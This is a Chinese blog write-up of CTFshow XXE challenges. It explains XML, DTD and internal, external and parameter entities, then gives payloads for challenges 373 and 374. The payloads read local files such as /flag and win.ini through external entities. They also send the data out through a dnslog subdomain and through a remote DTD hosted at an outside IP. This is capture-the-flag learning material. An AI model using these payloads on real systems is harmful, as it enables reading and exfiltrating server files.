---
title: CTFshowXXE
tags:
  - CTF
  - web
abbrlink: 949d2db6
date: 2022-05-01 23:50:10
---

## XML基础知识

要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成。

> XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素

### xml的基本格式

```
- 所有 XML 元素都须有关闭标签
- XML 标签对大小写敏感
- XML 必须正确地嵌套
- XML 文档必须有根元素
- XML 的属性值须加引号
```

这里放一个正规的例子

```xml
<bookstore> <!--根元素-->
<book category="COOKING"> <!--bookstore的子元素，category为属性-->
<title>Everyday Italian</title>      <!--book的子元素，lang为属性-->
<author>Giada De Laurentiis</author>       <!--book的子元素-->
<year>2005</year> <!--book的子元素-->
<price>30.00</price> <!--book的子元素-->
</book> <!--book的结束-->
</bookstore> <!--bookstore的结束-->
```

### DTD

文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例

```xml-dtd
<?xml version="1.0"?>//这一行是 XML 文档定义
<!DOCTYPE message [
<!ELEMENT message (receiver ,sender ,header ,msg)>
<!ELEMENT receiver (#PCDATA)>
<!ELEMENT sender (#PCDATA)>
<!ELEMENT header (#PCDATA)>
<!ELEMENT msg (#PCDATA)>
```

上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这样

```xml
<message>
<receiver>Myself</receiver>
<sender>Someone</sender>
<header>TheReminder</header>
<msg>This is an amazing book</msg>
</message>
```

### 内部实体

带有DTD的XML文档实例

```xml-dtd
<?xml version="1.0"?>//这一行是 XML 文档定义
<!DOCTYPE message [
<!ELEMENT message (receiver ,sender ,header ,msg)>
<!ELEMENT receiver (#PCDATA)>
<!ELEMENT sender (#PCDATA)>
<!ELEMENT header (#PCDATA)>
<!ELEMENT msg (#PCDATA)>
<message>
<receiver>Myself</receiver>
<sender>Someone</sender>
<header>TheReminder</header>
<msg>This is an amazing book</msg>
</message>
```

其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的

```xml-dtd
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "test" >]>
```

这里 定义元素为`ANY`说明接受任何元素，但是定义了一个 xml 的实体（实体其实可以看成一个变量，到时候我们可以在 XML 中通过 & 符号进行引用），那么 XML 就可以写成这样

```xml-dtd
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```

我们使用&xxe对上面定义的xxe实体进行了引用，到时候输出的时候&xxe就会被 “test” 替换。

### 外部实体

实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE root-element SYSTEM "file:///c:/test.dtd">
<note>
<to>Y0u</to>
<from>@re</from>
<head>v3ry</head>
<body>g00d!</body>
</note>
```

```xml-dtd
<!ELEMENT to (#PCDATA)><!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)><!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)><!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)><!--定义body元素为”#PCDATA”类型-->
```

![](https://img-blog.csdnimg.cn/20210305225448278.png)

当然，还有一种引用方式是使用 引用公用 DTD 的方法，语法如下：

```xml-dtd
<!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>
```

这个在我们的攻击中也可以起到和 SYSTEM 一样的作用

我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）

### 通用实体

用`&实体名;` 引用的实体，他在DTD 中定义，在 XML 文档中引用

```xml-dtd
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE updateProfile [<!ENTITY file SYSTEM "file:///c:/windows/win.ini"> ]> 
<updateProfile>  
    <firstname>Joe</firstname>  
    <lastname>&file;</lastname>  
    ... 
</updateProfile>
```

### 参数实体

(1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用
(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体
(3)和通用实体一样，参数实体也可以外部引用

```xml-dtd
<!ENTITY % an-element "<!ELEMENT mytag (subtag)>"> 
<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
%an-element; %remote-dtd;
```

在了解了基础知识后，下面开始了解xml外部实体注入引发的问题





















**373**

最简单的版本咯，带回显直接构造

```xml
<?xml version="1.0"?>
<!DOCTYPE xml [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<j1an>
<ctfshow>&xxe;</ctfshow>
</j1an>
```

**374**

没有回显需要外带了

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE xml [
<!ENTITY file SYSTEM "file:///flag">
<!ENTITY xxe SYSTEM "http://&file;.i1ecvd.dnslog.cn">
]>
<j1an>
<ctfshow>&xxe;</ctfshow>
</j1an>
```

这种方法不知道为啥带不出来

```xml-dtd
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % remote SYSTEM "http://20.231.29.154/1.xml">
%remote;
%send;
]>
```

```xml-dtd
#1.xml
<!ENTITY % all
"<!ENTITY &#x25; send SYSTEM 'http://20.231.29.154/1.php?1=%file;'>"
>
&all;
```

